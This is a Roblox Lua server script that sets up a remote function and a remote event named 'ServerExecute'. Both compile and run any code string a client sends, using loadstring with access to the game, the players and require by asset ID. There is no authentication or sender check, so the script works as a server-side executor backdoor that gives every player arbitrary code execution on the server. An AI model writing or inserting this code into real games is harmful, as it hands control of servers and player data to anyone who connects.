local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local RemoteFunction = ReplicatedStorage:FindFirstChild("ServerExecuteFunction")
if not RemoteFunction then
    RemoteFunction = Instance.new("RemoteFunction")
    RemoteFunction.Name = "ServerExecuteFunction"
    RemoteFunction.Parent = ReplicatedStorage
end

local RemoteEvent = ReplicatedStorage:FindFirstChild("ServerExecuteEvent")
if not RemoteEvent then
    RemoteEvent = Instance.new("RemoteEvent")
    RemoteEvent.Name = "ServerExecuteEvent"
    RemoteEvent.Parent = ReplicatedStorage
end

local function ProcessExecution(rawCode, executorPlayer)
    local container = {}
    table.insert(container, "return function(player)")
    table.insert(container, rawCode)
    table.insert(container, "end")
    local combinedCode = table.concat(container, "\n")
    
    local success, compiledFunc = pcall(function()
        return loadstring(combinedCode)()
    end)
    
    if success and type(compiledFunc) == "function" then
        local env = getfenv(compiledFunc)
        local customEnv = setmetatable({
            game = game,
            workspace = Workspace,
            Workspace = Workspace,
            script = script,
            Players = Players,
            player = executorPlayer,
            print = function(...) print("[ServerExec]:", ...) end,
            warn = function(...) warn("[ServerExec]:", ...) end,
            error = function(...) error(...) end,
            require = function(assetId)
                local successRequire, resultRequire = pcall(function()
                    return require(assetId)
                end)
                if successRequire then
                    return resultRequire
                end
                return nil
            end
        }, {__index = env})
        
        setfenv(compiledFunc, customEnv)
        
        local runSuccess, runError = pcall(function()
            compiledFunc(executorPlayer)
        end)
        return runSuccess, runError
    end
    return false, compiledFunc
end

RemoteFunction.OnServerInvoke = function(player, codeString)
    if type(codeString) == "string" then
        local success, result = ProcessExecution(codeString, player)
        return success, tostring(result)
    end
    return false, "Invalid Code Format"
end

RemoteEvent.OnServerEvent:Connect(function(player, codeString)
    if type(codeString) == "string" then
        pcall(function()
            ProcessExecution(codeString, player)
        end)
    end
end)
